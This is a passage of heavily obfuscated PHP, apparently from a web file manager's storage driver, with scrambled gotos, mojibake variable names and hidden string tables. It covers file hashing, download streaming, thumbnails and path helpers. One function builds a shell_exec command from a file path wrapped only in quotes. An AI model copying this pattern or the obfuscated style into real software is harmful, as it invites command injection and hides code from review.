hashMd5($bìÏ¡¶ §¦) { $bìÏ¡¶ §¦ = $this->iconvSystem($bìÏ¡¶ §¦); if (isset(self::$md5Cache[$bìÏ¡¶ §¦])) { return self::$md5Cache[$bìÏ¡¶ §¦]; } self::$md5Cache[$bìÏ¡¶ §¦] = $this->hashMd5Shell($bìÏ¡¶ §¦); if (!self::$md5Cache[$bìÏ¡¶ §¦]) { self::$md5Cache[$bìÏ¡¶ §¦] = @md5_file($bìÏ¡¶ §¦); } return self::$md5Cache[$bìÏ¡¶ §¦]; } private function hashMd5Shell($b½¿îĞÖ½) { goto A©ÓèƒŒö°; C¸ÁìÒë©: $DšŒ…É—Éù = shell_exec($D¤ìì—ˆ÷Û . "\40\x22{$b½¿îĞÖ½}\x22"); $DšŒ…É—Éù = str_replace($DÆñ‡êİ‚[100], $DÆñ‡êİ‚[33], $DšŒ…É—Éù); return substr($DšŒ…É—Éù, 0, 32); goto C›ÚÎ’ŒÉ; e¿ïÄÀÙ“: $D¤ìì—ˆ÷Û = Cache::get($DÆñ‡êİ‚[97]); if (!$D¤ìì—ˆ÷Û) { $b®õÚĞÚ¡¹ = BASIC_PATH . $DÆñ‡êİ‚[98]; $C”çÊË‘Õ½ = md5_file($b®õÚĞÚ¡¹); $D¤ìì—ˆ÷Û = $DÆñ‡êİ‚[99]; foreach ($EœÊ¬¦Ãâ‰ as $d×ØŒùÏİ) { $DšŒ…É—Éù = shell_exec($d×ØŒùÏİ . "\x20\x22{$b®õÚĞÚ¡¹}\42"); if ($DšŒ…É—Éù && substr(trim($DšŒ…É—Éù), 0, 32) == $C”çÊË‘Õ½) { $D¤ìì—ˆ÷Û = $d×ØŒùÏİ; break; } } Cache::set($DÆñ‡êİ‚[97], $D¤ìì—ˆ÷Û, 3600); } if ($D¤ìì—ˆ÷Û == $DÆñ‡êİ‚[99]) { return !1; } goto C¸ÁìÒë©; A©ÓèƒŒö°: $DÆñ‡êİ‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!function_exists($DÆñ‡êİ‚[94])) { return !1; } $EœÊ¬¦Ãâ‰ = array($DÆñ‡êİ‚[95], $DÆñ‡êİ‚[96]); goto e¿ïÄÀÙ“; C›ÚÎ’ŒÉ: } public function link($Bˆ÷˜ìğÚ²) { return $Bˆ÷˜ìğÚ²; } public function fileOut($CÆÓùô…¡é, $DÔÛàÒñ™è = false, $AÅ×ç‡†ÀÓ = false, $AçÕôå¬—• = '') { goto E¹Œ¼ÔÆÄÓ; AÜ÷‚Üô¬‹: $AÉÖá”¬Œ = get_file_mime($a‘Ü”ÇŠÃ¥); if (strstr($AÉÖá”¬Œ, $E”¤–§±[114])) { $AÉÖá”¬Œ = $AÉÖá”¬Œ . $E”¤–§±[115]; } if ($DÔÛàÒñ™è === !1 && !mime_support($AÉÖá”¬Œ)) { $DÔÛàÒñ™è = !0; $AÉÖá”¬Œ = $E”¤–§±[116]; } goto cÏ…œñè³Ñ; A•³â§‚¥­: if (isset($_SERVER[$E”¤–§±[128]]) && strtotime($_SERVER[$E”¤–§±[128]]) == $CºÂ‚‹–ô[$E”¤–§±[107]]) { header($E”¤–§±[129], !0, 304); die; } if (isset($_SERVER[$E”¤–§±[130]]) && $_SERVER[$E”¤–§±[130]] == $AçÕôå¬—•) { header($E”¤–§±[131] . $AçÕôå¬—•, !0, 304); die; } header($E”¤–§±[131] . $AçÕôå¬—•); goto D¨…Ê¡À; dº–˜‰‘›Â: header($E”¤–§±[121]); header($E”¤–§±[122] . $AÉÖá”¬Œ); header($E”¤–§±[123] . gmdate($E”¤–§±[106], time() + 3600 * 24 * 30) . $E”¤–§±[124]); goto c©šÀø›¿; b³ŸÉˆ„İ: if ($E³§œŸ‡ÕÄ) { $e—š­íğø… = intval(1000 * 1000 * ($d”ÓîÈºÖ… / $E³§œŸ‡ÕÄ)); } while ($Eô‰ä³¬Ô <= $CÄÀö­£è) { $aÁ¨‡õ–ä¸ = timeFloat(); check_abort(); $F¡Ü‘Ù­š– = $CÄÀö­£è - $Eô‰ä³¬Ô + 1; if ($F¡Ü‘Ù­š– <= $d”ÓîÈºÖ…) { $d”ÓîÈºÖ… = $F¡Ü‘Ù­š–; } echo $this->fileSubstr($CÆÓùô…¡é, $Eô‰ä³¬Ô, $d”ÓîÈºÖ…); $Eô‰ä³¬Ô += $d”ÓîÈºÖ…; if ($d”ÓîÈºÖ… == $F¡Ü‘Ù­š–) { $Eô‰ä³¬Ô = $CÄÀö­£è + 1; } if ($e—š­íğø…) { $c¸±’É‡‡ = intval(1000 * 1000 * (timeFloat() - $aÁ¨‡õ–ä¸)); $Aœİˆ‘‚Ò = $e—š­íğø… - $c¸±’É‡‡; if ($Aœİˆ‘‚Ò > 5) { usleep($Aœİˆ‘‚Ò); } } } goto d¥„ŞàáŠô; aé‹áï‹¿Ş: $EÀĞ¶íÔãĞ = strtolower($_SERVER[$E”¤–§±[139]]); if ($FÌè›³ª¹í && $EÀĞ¶íÔãĞ && $FÃ™ˆ˜»§Ş) { if (strstr($EÀĞ¶íÔãĞ, $E”¤–§±[140])) { header($E”¤–§±[141] . $CÆÓùô…¡é); } else { if (strstr($EÀĞ¶íÔãĞ, $E”¤–§±[142])) { header($E”¤–§±[143] . $CÆÓùô…¡é); } else { if (strstr($EÀĞ¶íÔãĞ, $E”¤–§±[144])) { header($E”¤–§±[145] . $CÆÓùô…¡é); } } } if ($E³§œŸ‡ÕÄ) { header($E”¤–§±[146] . $E³§œŸ‡ÕÄ); } return; } if (isset($_SERVER[$E”¤–§±[147]])) { if (preg_match($E”¤–§±[148], $_SERVER[$E”¤–§±[147]], $bò£‘µ’®š)) { $Eô‰ä³¬Ô = intval($bò£‘µ’®š[1]); if (!empty($bò£‘µ’®š[2])) { $CÄÀö­£è = intval($bò£‘µ’®š[2]); } } header($E”¤–§±[149]); header("\103\157\x6e\164\145\x6e\x74\55\122\141\x6e\x67\145\x3a\40\142\171\164\145\x73\40{$Eô‰ä³¬Ô}\x2d{$CÄÀö­£è}\57" . $DÇ¸Ğµ³ç¨); } else { header($E”¤–§±[150]); } goto d°ÆÒ‡£œ; D¨…Ê¡À: header($E”¤–§±[132] . $d¬èñ•‰©Å . $E”¤–§±[124]); header($E”¤–§±[133] . $D›îºâäŸÛ); header($E”¤–§±[134]); goto fĞ™£”Œº; CŒÚ˜İ•Ï: if (in_array($a‘Ü”ÇŠÃ¥, array($E”¤–§±[108], $E”¤–§±[109], $E”¤–§±[110], $E”¤–§±[111]))) { $a‘Ü”ÇŠÃ¥ = $E”¤–§±[112]; } if (!$AçÕôå¬—•) { $AçÕôå¬—• = md5($d¬èñ•‰©Å . $this->hashSimple($CÆÓùô…¡é)); } $AçÕôå¬—• = $E”¤–§±[113] . $AçÕôå¬—• . $E”¤–§±[113]; goto AÜ÷‚Üô¬‹; E¹Œ¼ÔÆÄÓ: $E”¤–§± =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->cacheMethod(null, null); if (!$CÆÓùô…¡é || !$this->exist($CÆÓùô…¡é)) { show_json(LNG($E”¤–§±[101]), !1, $AÅ×ç‡†ÀÓ); } goto f­óÜê×; d°ÆÒ‡£œ: $E‘˜—Õ¤ = !0; if ($_SERVER[$E”¤–§±[151]] == $E”¤–§±[152] && $DÇ¸Ğµ³ç¨ > 1204 * 1024 * 1024 * 2) { $E‘˜—Õ¤ = !1; } if ($E‘˜—Õ¤) { header($E”¤–§±[153] . ($CÄÀö­£è - $Eô‰ä³¬Ô + 1)); } goto e©íÔğøõ§; fĞ™£”Œº: header($E”¤–§±[135] . $DÇ¸Ğµ³ç¨); header($E”¤–§±[136]); if (!$DÔÛàÒñ™è && $a‘Ü”ÇŠÃ¥ == $E”¤–§±[137]) { if ($DÇ¸Ğµ³ç¨ > 1024 * 1024 * 5) { die; } $a±çæãëğÀ = $this->getContent($CÆÓùô…¡é); $a±çæãëğÀ = Html::clearSVG($a±çæãëğÀ); header($E”¤–§±[138] . strlen($a±çæãëğÀ)); echo $a±çæãëğÀ; die; } goto aé‹áï‹¿Ş; e©íÔğøõ§: if ($_SERVER[$E”¤–§±[154]] == $E”¤–§±[155]) { return; } $d”ÓîÈºÖ… = 1024 * 100; $e—š­íğø… = 0; goto b³ŸÉˆ„İ; A§¼”ï¢¢›: $DÇ¸Ğµ³ç¨ = $CºÂ‚‹–ô[$E”¤–§±[77]]; $d¬èñ•‰©Å = gmdate($E”¤–§±[106], $CºÂ‚‹–ô[$E”¤–§±[107]]); $D›îºâäŸÛ = $AÅ×ç‡†ÀÓ ? $AÅ×ç‡†ÀÓ : $this->iconvApp($CºÂ‚‹–ô[$E”¤–§±[28]]); goto F›¸ñˆ©öŠ; c©šÀø›¿: header($E”¤–§±[125]); header($E”¤–§±[126]); header($E”¤–§±[127]); goto A•³â§‚¥­; A·‚—¤• ˜: @ob_end_clean(); set_timeout(); $CºÂ‚‹–ô = $this->infoFull($CÆÓùô…¡é); goto A§¼”ï¢¢›; cÏ…œñè³Ñ: $CÕ‡††àÂÙ = rawurlencode($D›îºâäŸÛ); $CÕ‡††àÂÙ = $E”¤–§±[113] . $CÕ‡††àÂÙ . $E”¤–§±[117] . $CÕ‡††àÂÙ; if ($DÔÛàÒñ™è) { header($E”¤–§±[118]); header($E”¤–§±[119] . $CÕ‡††àÂÙ); } else { header($E”¤–§±[120] . $CÕ‡††àÂÙ); } goto dº–˜‰‘›Â; F›¸ñˆ©öŠ: $Eô‰ä³¬Ô = 0; $CÄÀö­£è = $DÇ¸Ğµ³ç¨ - 1; $a‘Ü”ÇŠÃ¥ = $this->ext($D›îºâäŸÛ); goto CŒÚ˜İ•Ï; f­óÜê×: $FÌè›³ª¹í = $this->getType() == $E”¤–§±[102]; $FÃ™ˆ˜»§Ş = $GLOBALS[$E”¤–§±[6]][$E”¤–§±[84]][$E”¤–§±[103]][$E”¤–§±[104]]; $E³§œŸ‡ÕÄ = (double) $GLOBALS[$E”¤–§±[6]][$E”¤–§±[84]][$E”¤–§±[103]][$E”¤–§±[105]] * 1024 * 1024; goto A·‚—¤• ˜; d¥„ŞàáŠô: } public function fileOutServer($cœ”Ğ˜¼Å, $dçã›õ¤Š = false, $CˆÛš°·ˆ = false, $e·¸„ÌòÍÏ = '') { $this->fileOut($cœ”Ğ˜¼Å, $dçã›õ¤Š, $CˆÛš°·ˆ, $e·¸„ÌòÍÏ); } public function fileOutLink($BÁßÏÈå¼) { header($_SERVER[åÌÛ»ô¢‚ö™][156] . $BÁßÏÈå¼); die; } public function cacheMethod($Bè“†Â¥Ëª, $a¤œ¢—„Ú¯, $EÁåŒôÉÓ = null) { goto C«…Œ—”; DØİ¸Àæ¨Ä: $d˜øâº³ùé = $this->{$Bè“†Â¥Ëª}($a¤œ¢—„Ú¯); $Dˆ¶¡š‹À§[$fƒ¼×Ô ğĞ] = $d˜øâº³ùé; return $d˜øâº³ùé; goto dÇ£À›ğ®Â; D›·Åœ¿: $fƒ¼×Ô ğĞ = $d¤Î×ïæê¾[157] . $Bè“†Â¥Ëª . $d¤Î×ïæê¾[158] . rtrim($fˆ¡á—à’, $d¤Î×ïæê¾[8]); if (is_null($Bè“†Â¥Ëª)) { $Dˆ¶¡š‹À§ = array(); return; } if (is_null($a¤œ¢—„Ú¯)) { unset($Dˆ¶¡š‹À§[$fƒ¼×Ô ğĞ]); return; } goto aÖÏ„¥ßÜ¶; aÖÏ„¥ßÜ¶: if (!is_null($EÁåŒôÉÓ)) { $Dˆ¶¡š‹À§[$fƒ¼×Ô ğĞ] = $EÁåŒôÉÓ; return; } $d˜øâº³ùé = isset($Dˆ¶¡š‹À§[$fƒ¼×Ô ğĞ]) ? $Dˆ¶¡š‹À§[$fƒ¼×Ô ğĞ] : null; if (!is_null($d˜øâº³ùé)) { return $d˜øâº³ùé; } goto DØİ¸Àæ¨Ä; C«…Œ—”: $d¤Î×ïæê¾ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $Dˆ¶¡š‹À§ = array(); $fˆ¡á—à’ = $a¤œ¢—„Ú¯ ? ltrim($this->getPathOuter($a¤œ¢—„Ú¯), $d¤Î×ïæê¾[8]) : $a¤œ¢—„Ú¯; goto D›·Åœ¿; dÇ£À›ğ®Â: } public function fileOutImage($d™Æ™íŠƒŸ, $bäÇÙÍôí = 250) { goto dÚ‚Ñ¼Òˆ´; B…ôªàÉ¸: IO::fileOut($e•£êÀ•š”); goto eÂö¼Ë²î…; Bå³²ñÊ: if (!($dØ¨ªÖ•Ëã = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $DÅÅÒœ“©[169]))) { $D­À†‚¼Ï = IO::mkdir(IO_PATH_SYSTEM_TEMP . $DÅÅÒœ“©[170]); } else { $D­À†‚¼Ï = KodIO::make($dØ¨ªÖ•Ëã); } if ($dØ¨ªÖ•Ëã = IO::fileNameExist($D­À†‚¼Ï, $d»Ö¹“Âö)) { $Eİ¢†µ©¿ñ = KodIO::make($dØ¨ªÖ•Ëã); return IO::fileOut($Eİ¢†µ©¿ñ, !1, $EÜ¨îÓÆ¶); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto e‰†òÕğÚ‘; e‰†òÕğÚ‘: $Eİ¢†µ©¿ñ = DATA_THUMB . $d»Ö¹“Âö; del_file($Eİ¢†µ©¿ñ); if (!@file_exists($Eİ¢†µ©¿ñ)) { $DÄ¹™¥…œ… = TEMP_FILES; if (!is_dir($DÄ¹™¥…œ…)) { mk_dir($DÄ¹™¥…œ…); } $A“Ú”„—® = $DÄ¹™¥…œ… . $EƒóËß“› . $DÅÅÒœ“©[91] . $E°œ™ø‰ñ[$DÅÅÒœ“©[165]]; if (!@file_exists($A“Ú”„—®)) { $A“Ú”„—® = $this->download($d™Æ™íŠƒŸ, $A“Ú”„—®); } $a‰’“©œ = new ImageThumb($A“Ú”„—®, $DÅÅÒœ“©[171]); $a‰’“©œ->prorate($Eİ¢†µ©¿ñ, $bäÇÙÍôí, $bäÇÙÍôí * 10); } goto A»–¸µ¸‡ø; C­ôÌš‘—Ï: if ($E°œ™ø‰ñ[$DÅÅÒœ“©[77]] <= 1024 * 50 || $cÆ¿Æ“øÂ½ || !function_exists($DÅÅÒœ“©[164]) || $E°œ™ø‰ñ[$DÅÅÒœ“©[165]] == $DÅÅÒœ“©[166]) { return $this->fileOut($d™Æ™íŠƒŸ, !1, $EÜ¨îÓÆ¶); } if (isset($E°œ™ø‰ñ[$DÅÅÒœ“©[161]][$DÅÅÒœ“©[167]])) { $EƒóËß“› = $E°œ™ø‰ñ[$DÅÅÒœ“©[161]][$DÅÅÒœ“©[167]]; } else { if (isset($E°œ™ø‰ñ[$DÅÅÒœ“©[161]][$DÅÅÒœ“©[168]])) { $EƒóËß“› = $E°œ™ø‰ñ[$DÅÅÒœ“©[161]][$DÅÅÒœ“©[168]]; } else { $EƒóËß“› = md5("{$E°œ™ø‰ñ[$DÅÅÒœ“©[28]]}\137{$E°œ™ø‰ñ[$DÅÅÒœ“©[75]]}\x5f{$E°œ™ø‰ñ[$DÅÅÒœ“©[77]]}"); } } $d»Ö¹“Âö = "{$EƒóËß“›}\x5f{$bäÇÙÍôí}\x2e\x70\x6e\147"; goto Bå³²ñÊ; f‚’àƒÃÂ†: $EÜ¨îÓÆ¶ = $E°œ™ø‰ñ[$DÅÅÒœ“©[28]]; $cÆ¿Æ“øÂ½ = !1; if (isset($GLOBALS[$DÅÅÒœ“©[159]]) && $GLOBALS[$DÅÅÒœ“©[159]][$DÅÅÒœ“©[75]] == $E°œ™ø‰ñ[$DÅÅÒœ“©[75]]) { $E­íÈ°•ğã = $GLOBALS[$DÅÅÒœ“©[159]][$DÅÅÒœ“©[160]]; if (!$E°œ™ø‰ñ[$DÅÅÒœ“©[161]]) { $E°œ™ø‰ñ[$DÅÅÒœ“©[161]] = $GLOBALS[$DÅÅÒœ“©[159]]; } if (isset($E­íÈ°•ğã[$DÅÅÒœ“©[162]])) { if ($E­íÈ°•ğã[$DÅÅÒœ“©[162]] <= $bäÇÙÍôí && $E­íÈ°•ğã[$DÅÅÒœ“©[163]] <= $bäÇÙÍôí) { $cÆ¿Æ“øÂ½ = !0; } } $EÜ¨îÓÆ¶ = $E°œ™ø‰ñ[$DÅÅÒœ“©[161]][$DÅÅÒœ“©[28]]; } goto C­ôÌš‘—Ï; dÚ‚Ñ¼Òˆ´: $DÅÅÒœ“© =& $_SERVER[åÌÛ»ô¢‚ö™]; if (substr($d™Æ™íŠƒŸ, 0, 4) == $DÅÅÒœ“©[144]) { $this->fileOutLink($d™Æ™íŠƒŸ); } $E°œ™ø‰ñ = $this->info($d™Æ™íŠƒŸ); goto f‚’àƒÃÂ†; A»–¸µ¸‡ø: if (!file_exists($Eİ¢†µ©¿ñ) || filesize($Eİ¢†µ©¿ñ) < 100) { return @file_exists($A“Ú”„—®) ? IO::fileOut($A“Ú”„—®) : $this->fileOut($d™Æ™íŠƒŸ); } if (!($e•£êÀ•š” = IO::move($Eİ¢†µ©¿ñ, $D­À†‚¼Ï))) { return IO::fileOut($Eİ¢†µ©¿ñ); } del_file($Eİ¢†µ©¿ñ); goto B…ôªàÉ¸; eÂö¼Ë²î…: } public function fileOutImageServer($cƒñŸÖ§ã„, $AÙØÇœŒ˜ = 250) { $this->fileOutImage($cƒñŸÖ§ã„, $AÙØÇœŒ˜); } public function fileNameAuto($e„õ²Àî†, $fàÉö‚¢Òè, $e»®òšå¸ = REPEAT_RENAME, $eí»©œç¦ = false) { goto C§ğ‘­ö¤Œ; C§ğ‘­ö¤Œ: $c± ÊŒæÄ  =& $_SERVER[åÌÛ»ô¢‚ö™]; $A‡Æ¬ñå¥Ê = $e„õ²Àî† === $c± ÊŒæÄ [33] ? $fàÉö‚¢Òè : rtrim($e„õ²Àî†, $c± ÊŒæÄ [8]) . $c± ÊŒæÄ [8] . $fàÉö‚¢Òè; if ($e»®òšå¸ == REPEAT_REPLACE || !$this->exist($A‡Æ¬ñå¥Ê) || $eí»©œç¦ && $e»®òšå¸ != REPEAT_RENAME_FOLDER) { return $fàÉö‚¢Òè; } goto dËÍö›±…ˆ; aç¶ê²Â’: $FÍã±‡î„ = 1; $FÉá²²ò¢ = substr($fàÉö‚¢Òè, 0, strlen($fàÉö‚¢Òè) - strlen($Eè…ìˆ¬ÕŞ)); $fÜ®¶ÜÈÈ = $FÉá²²ò¢ . "\50{$FÍã±‡î„}\51{$Eè…ìˆ¬ÕŞ}"; goto d·œˆƒ£˜œ; dËÍö›±…ˆ: if ($e»®òšå¸ == REPEAT_SKIP) { return !1; } $Eè…ìˆ¬ÕŞ = $c± ÊŒæÄ [91] . get_path_ext($fàÉö‚¢Òè); $Eè…ìˆ¬ÕŞ = $Eè…ìˆ¬ÕŞ == $c± ÊŒæÄ [91] || $eí»©œç¦ ? $c± ÊŒæÄ [33] : $Eè…ìˆ¬ÕŞ; goto aç¶ê²Â’; d·œˆƒ£˜œ: while ($this->exist(rtrim($e„õ²Àî†, $c± ÊŒæÄ [8]) . $c± ÊŒæÄ [8] . $fÜ®¶ÜÈÈ)) { $fÜ®¶ÜÈÈ = $FÉá²²ò¢ . "\50{$FÍã±‡î„}\x29{$Eè…ìˆ¬ÕŞ}"; $FÍã±‡î„++; } return $fÜ®¶ÜÈÈ; goto BÚéÁÈßêŠ; BÚéÁÈßêŠ: } public function listAllFiles($B—øóÑâº, $e®ÁŸô¼‰Î, $eø˜¢¦Ÿ±æ = array()) { goto FŠçÑÉæßº; aÎˆÉ¬ãÍê: $B—øóÑâº = trim($B—øóÑâº, $f†Æ¦šÇ¿…[8]); foreach ($e®ÁŸô¼‰Î as $Dë…áê¢·Ï) { $D®·ÖÈ¡Ÿ¼ = ltrim(substr($Dë…áê¢·Ï, strlen($B—øóÑâº)), $f†Æ¦šÇ¿…[8]); $Dèùœ®…œÁ = array_merge($Dèùœ®…œÁ, $this->slicePath($D®·ÖÈ¡Ÿ¼)); } $fÂš¥¯‹…ó = array(); goto DÊ†©“Â¥; DÊ†©“Â¥: foreach (array_unique($Dèùœ®…œÁ) as $Dë…áê¢·Ï) { $AÄ–˜¥®£ = array($f†Æ¦šÇ¿…[75] => $this->getPathOuter($f†Æ¦šÇ¿…[8] . $B—øóÑâº . $f†Æ¦šÇ¿…[8] . $Dë…áê¢·Ï), $f†Æ¦šÇ¿…[76] => 1, $f†Æ¦šÇ¿…[77] => 0); if (substr($Dë…áê¢·Ï, -1) != $f†Æ¦šÇ¿…[8]) { $AÄ–˜¥®£[$f†Æ¦šÇ¿…[76]] = 0; $DŸÖ‡Á„£ = $this->getPath($B—øóÑâº . $f†Æ¦šÇ¿…[8] . $Dë…áê¢·Ï); $AÄ–˜¥®£[$f†Æ¦šÇ¿…[77]] = isset($eø˜¢¦Ÿ±æ[$DŸÖ‡Á„£]) ? $eø˜¢¦Ÿ±æ[$DŸÖ‡Á„£] : $this->size($DŸÖ‡Á„£); } $fÂš¥¯‹…ó[] = $AÄ–˜¥®£; } return $fÂš¥¯‹…ó; goto E±ñöß„½É; FŠçÑÉæßº: $f†Æ¦šÇ¿… =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($e®ÁŸô¼‰Î)) { return array(); } $Dèùœ®…œÁ = array(); goto aÎˆÉ¬ãÍê; E±ñöß„½É: } public function slicePath($cÑ²°¹­ÔÃ) { $a‰†™‰¶Ğ  =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¬áíØãç‹ = explode($a‰†™‰¶Ğ [8], trim($cÑ²°¹­ÔÃ, $a‰†™‰¶Ğ [8])); $aé¾áÂ”¥’ = 0; do { ++$aé¾áÂ”¥’; $f”Ñù™¹ì[] = implode($a‰†™‰¶Ğ [8], array_slice($D¬áíØãç‹, 0, $aé¾áÂ”¥’)) . $a‰†™‰¶Ğ [8]; } while ($aé¾áÂ”¥’ < count($D¬áíØãç‹)); $f”Ñù™¹ì[count($D¬áíØãç‹) - 1] = $cÑ²°¹­ÔÃ; return $f”Ñù™¹ì; } public function getHost() { $c„Æ‘Ú–‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F³å—·ÊÎ = parse_url(trim($this->domain, $c„Æ‘Ú–‚[8])); $C«ÈÁñÏğ = isset($F³å—·ÊÎ[$c„Æ‘Ú–‚[172]]) ? $F³å—·ÊÎ[$c„Æ‘Ú–‚[172]] : http_type(); $B÷×‹‚¢Æ£ = isset($F³å—·ÊÎ[$c„Æ‘Ú–‚[173]]) ? $F³å—·ÊÎ[$c„Æ‘Ú–‚[173]] : $F³å—·ÊÎ[$c„Æ‘Ú–‚[75]]; if (isset($F³å—·ÊÎ[$c„Æ‘Ú–‚[174]])) { $B÷×‹‚¢Æ£ .= $c„Æ‘Ú–‚[4] . $F³å—·ÊÎ[$c„Æ‘Ú–‚[174]]; } return $C«ÈÁñÏğ . $c„Æ‘Ú–‚[175] . $B÷×‹‚¢Æ£; } public function pathEncode($CÃÉî¸í‰Í) { $FË‰Ùºàè =& $_SERVER[åÌÛ»ô¢‚ö™]; return str_replace($FË‰Ùºàè[176], $FË‰Ùºàè[8], rawurlencode($CÃÉî¸í‰Í)); } } $E‘Ä¹»Ğ· = LIB_DIR . $_SERVER[åÌÛ»ô¢‚ö™][177]; $B¨ÙÒƒºù = $_SERVER[åÌÛ»ô¢‚ö™][178]; goto BØ¬È§—Ş; f”È—ÉÂ—: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\x63\145"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\x6d\145" => "\x69\x6f\137\163\x6f\x75\x72\x63\x65\x5f\155\x65\x74\141", "\155\145\164\x61\x46\151\145\154\144" => "\x73\x6f\165\x72\143\x65\x49\104"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\151\x6d\145", "\x74\x69\155\145", "\151\156\163\x65\162\164", "\x66\x75\x6e\x63\164\151\157\x6e"), array("\143\x72\x65\141\164\x65\x54\151\155\145", "\x74\151\x6d\x65", "\151\156\163\x65\162\x74", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\166\x69\145\167\x54\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\x73\x65\x72\164", "\146\165\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($A¥êæÔâãõ) { return $this->listSource(array($_SERVER[åÌÛ»ô¢‚ö™][393] => $A¥êæÔâãõ)); } public function typeName($Fœ²ñÂØÃ½) { static $EÊ×¶Ğ—çå = array(self::TYPE_SYSTEM => "\163\171\163\164\x65\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\x72\x6f\x75\160"); return $EÊ×¶Ğ—çå[$Fœ²ñÂØÃ½ . $_SERVER[åÌÛ»ô¢‚ö™][33]]; } public function sourceListInfo($AÙÙ¦ƒê“Ü, $b¾†Şî³„Ç = false) { goto b‚…ˆ¥ä„¬; AÛ¦°™ìÍİ: if (!$AÙÙ¦ƒê“Ü) { return array(); } $E›Æ‹ø ¾» = $this->where(array($e¬ÔÅò„á«[394] => array($e¬ÔÅò„á«[7], $AÙÙ¦ƒê“Ü)))->select(); $this->_listDataApply($E›Æ‹ø ¾», $b¾†Şî³„Ç); goto CÜÅáêºé; b‚…ˆ¥ä„¬: $e¬ÔÅò„á« =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÙÙ¦ƒê“Ü = $AÙÙ¦ƒê“Ü ? $AÙÙ¦ƒê“Ü : array(); $AÙÙ¦ƒê“Ü = array_filter(array_unique($AÙÙ¦ƒê“Ü)); goto AÛ¦°™ìÍİ; CÜÅáêºé: return array_to_keyvalue($E›Æ‹ø ¾», $e¬ÔÅò„á«[394]); goto A»‡ÌìÎÜ; A»‡ÌìÎÜ: } public function pathInfoFilter($f‡ÊöĞ…¯À) { goto BÎÁø´†ñ¿; c´ÜÛó¼’¿: if (isset($f‡ÊöĞ…¯À[$D¶‰âµ£­[401]]) && $f‡ÊöĞ…¯À[$D¶‰âµ£­[401]][$D¶‰âµ£­[402]] == -1) { $A¥İ¨†» = array_remove_value($A¥İ¨†», $D¶‰âµ£­[200]); $A¥İ¨†» = array_remove_value($A¥İ¨†», $D¶‰âµ£­[107]); $A¥İ¨†» = array_remove_value($A¥İ¨†», $D¶‰âµ£­[403]); $A¥İ¨†» = array_remove_value($A¥İ¨†», $D¶‰âµ£­[404]); $A¥İ¨†» = array_remove_value($A¥İ¨†», $D¶‰âµ£­[77]); $A¥İ¨†» = array_remove_value($A¥İ¨†», $D¶‰âµ£­[405]); } $f‡ÊöĞ…¯À = array_field_key($f‡ÊöĞ…¯À, $A¥İ¨†»); return $f‡ÊöĞ…¯À; goto a¼ì’ôæãŞ; BÎÁø´†ñ¿: $D¶‰âµ£­ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f‡ÊöĞ…¯À[$D¶‰âµ£­[75]] = KodIO::make($f‡ÊöĞ…¯À[$D¶‰âµ£­[394]]); $f‡ÊöĞ…¯À[$D¶‰âµ£­[29]] = $f‡ÊöĞ…¯À[$D¶‰âµ£­[395]] == 1 ? $D¶‰âµ£­[76] : $D¶‰âµ£­[171]; goto BÃàŞ•Â˜‹; F‰¾ƒ‰³‰: $CÒ“š©Îº .= $D¶‰âµ£­[399]; $CÒ“š©Îº .= $D¶‰âµ£­[400]; $A¥İ¨†» = explode($D¶‰âµ£­[47], $CÒ“š©Îº); goto c´ÜÛó¼’¿; BÃàŞ•Â˜‹: $f‡ÊöĞ…¯À[$D¶‰âµ£­[396]] = $this->typeName($f‡ÊöĞ…¯À[$D¶‰âµ£­[396]]); if ($f‡ÊöĞ…¯À[$D¶‰âµ£­[395]] != 1) { $f‡ÊöĞ…¯À[$D¶‰âµ£­[165]] = $f‡ÊöĞ…¯À[$D¶‰âµ£­[397]]; unset($f‡ÊöĞ…¯À[$D¶‰âµ£­[397]]); } $CÒ“š©Îº = $D¶‰âµ£­[398]; goto F‰¾ƒ‰³‰; a¼ì’ôæãŞ: } public function listUserFav() { goto dïù™Óõ¼—; Cõ¼ÉÜÄ—Õ: foreach ($fÃß¯¯‡ as &$f’‡¢ÀÊá) { $f’‡¢ÀÊá = array($Eƒ¤»¡¤­Å[410] => $f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[392]], $Eƒ¤»¡¤­Å[411] => $f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[28]], $Eƒ¤»¡¤­Å[412] => $f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[75]], $Eƒ¤»¡¤­Å[413] => $f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[29]], $Eƒ¤»¡¤­Å[414] => $f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[200]], $Eƒ¤»¡¤­Å[415] => $f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[107]]); if ($f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[29]] == $Eƒ¤»¡¤­Å[407] && $cñ®İäé‹¿[$f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[75]]]) { $f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[416]] = $cñ®İäé‹¿[$f’‡¢ÀÊá[$Eƒ¤»¡¤­Å[75]]]; } } unset($f’‡¢ÀÊá); return $fÃß¯¯‡; goto e‘Œ—ÙÓ¼§; F”ˆ›ƒ‘“: $EéÀÆÄÛå¹ = array_to_keyvalue($EéÀÆÄÛå¹, $Eƒ¤»¡¤­Å[33], $Eƒ¤»¡¤­Å[75]); if ($EéÀÆÄÛå¹) { $cñ®İäé‹¿ = $this->listSource(array($Eƒ¤»¡¤­Å[408] => 